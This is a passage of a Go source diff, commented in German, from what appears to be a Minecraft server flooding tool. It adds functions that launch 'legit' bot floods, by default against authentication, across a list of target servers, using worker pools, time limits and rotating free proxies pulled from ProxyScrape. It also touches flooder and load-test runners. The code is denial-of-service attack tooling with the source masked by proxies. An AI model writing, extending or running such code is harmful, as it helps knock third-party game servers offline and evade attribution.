-					Port:     parts[1],
-					Protocol: protocol,
-					Type:     "rotating",
-				})
-			}
+
+		parts := strings.Split(entry, ":")
+		if len(parts) < 2 {
+			utils.Warning("Ungültiges Proxy-Format: %s", entry)
+			continue
 		}
+
+		proxies = append(proxies, ProxyConfig{
+			Protocol: protocol,
+			Host:     parts[0],
+			Port:     parts[1],
+		})
 	}
 	return proxies
 }
@@ -709,22 +673,66 @@ func loadProxiesFromProxyScrape(scrapeType string) []ProxyConfig {
 
 	switch scrapeType {
 	case "socks5":
-		apiURL = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=1000"
+		apiURL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all"
 		preferredProtocol = "socks5"
 	case "http":
-		apiURL = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=1000"
+		apiURL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
 		preferredProtocol = "http"
 	default:
-		apiURL = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=all&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=1000"
+		apiURL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all"
+		preferredProtocol = "socks5"
 	}
 
 	proxies, err := downloadProxiesFromAPI(apiURL, preferredProtocol)
 	if err != nil {
-		utils.Error("ProxyScrape Download fehlgeschlagen: %v", err)
+		utils.Error("Fehler beim Laden von ProxyScrape: %v", err)
 		return []ProxyConfig{}
 	}
 
 	return proxies
+}
+
+func runMinecraftLegitCommandLine(serverList string, workers int, duration time.Duration,
+	floodTypeVal string, proxies []ProxyConfig, useRotating bool, protocolVersion int32) {
+
+	servers := strings.Split(serverList, ",")
+	for i := range servers {
+		servers[i] = strings.TrimSpace(servers[i])
+	}
+
+	if floodTypeVal == "" {
+		floodTypeVal = "legit_authentication"
+		utils.Info("Kein Flood-Typ angegeben, verwende: %s", floodTypeVal)
+	}
+
+	// Konvertiere Flood-Typ zu Method-Name
+	methodName := strings.TrimPrefix(floodTypeVal, "legit_")
+
+	utils.Info("Starte Minecraft Legit Bot...")
+	utils.Info("Methode: %s, Protokoll: %d", methodName, protocolVersion)
+	utils.Info("Server: %d, Worker: %d, Dauer: %v", len(servers), workers, duration)
+	utils.Info("Proxys: %d (Rotation: %v)", len(proxies), useRotating)
+
+	// Konvertiere ProxyConfig zu minecraft_legit.ProxyConfig
+	legitProxies := make([]minecraft_legit.ProxyConfig, len(proxies))
+	for i, p := range proxies {
+		legitProxies[i] = minecraft_legit.ProxyConfig{
+			Protocol: p.Protocol,
+			Host:     p.Host,
+			Port:     p.Port,
+			Username: p.Username,
+			Password: p.Password,
+			Type:     p.Type,
+		}
+	}
+
+	legit := minecraft_legit.NewMinecraftLegit(servers, legitProxies, useRotating,
+		workers, duration, methodName, protocolVersion)
+
+	ctx := context.Background()
+	if err := legit.Start(ctx); err != nil {
+		utils.Error("Fehler beim Ausführen: %v", err)
+	}
 }
 
 func runMinecraftFlooderCommandLine(serverList string, workers, rps int,
@@ -769,21 +777,20 @@ func runLoadTestCommandLine(serverList string, workers, rps int,
 	if len(proxies) > 0 {
 		var addErrors []string
 		for _, p := range proxies {
-			err := tester.AddProxy(p.Protocol, p.Host, p.Port, p.Username, p.Password, "")
+			err := tester.AddProxy(p.Host, p.Port, p.Protocol, p.Username, p.Password)
 			if err != nil {
-				addErrors = append(addErrors, fmt.Sprintf("%s:%s - %v", p.Host, p.Port, err))
+				addErrors = append(addErrors, err.Error())
 			}
 		}
 
 		if len(addErrors) > 0 && len(addErrors) < 10 {
-			utils.Warning("Proxy-Fehler:")
 			for _, errMsg := range addErrors {
-				utils.Warning("  %s", errMsg)
+				utils.Warning("Proxy-Fehler: %s", errMsg)
 			}
 		}
 
 		if len(tester.proxies) == 0 {
-			utils.Warning("Keine gültigen Proxys verfügbar - verwende direkte Verbindung")
+			utils.Fatal("Keine gültigen Proxys verfügbar")
 		}
 	}
 
@@ -793,4 +800,31 @@ func runLoadTestCommandLine(serverList string, workers, rps int,
 	utils.Info("Proxys: %d (Rotation: %v)", len(proxies), useRotating)
 
 	tester.Start()
+}
+
+func runMinecraftLegit(servers []string, workers int, duration time.Duration,
+	floodType string, proxies []ProxyConfig, useRotating bool) {
+
+	methodName := strings.TrimPrefix(floodType, "legit_")
+
+	// Konvertiere ProxyConfig zu minecraft_legit.ProxyConfig
+	legitProxies := make([]minecraft_legit.ProxyConfig, len(proxies))
+	for i, p := range proxies {
+		legitProxies[i] = minecraft_legit.ProxyConfig{
+			Protocol: p.Protocol,
+			Host:     p.Host,
+			Port:     p.Port,
+			Username: p.Username,
+			Password: p.Password,
+			Type:     p.Type,
+		}
+	}
+
+	legit := minecraft_legit.NewMinecraftLegit(servers, legitProxies, useRotating,
+		workers, duration, methodName, 763)
+
+	ctx := context.Background()
+	if err := legit.Start(ctx); err != nil {
+		utils.Error("Fehler beim Ausführen: %v", err)
+	}
 }
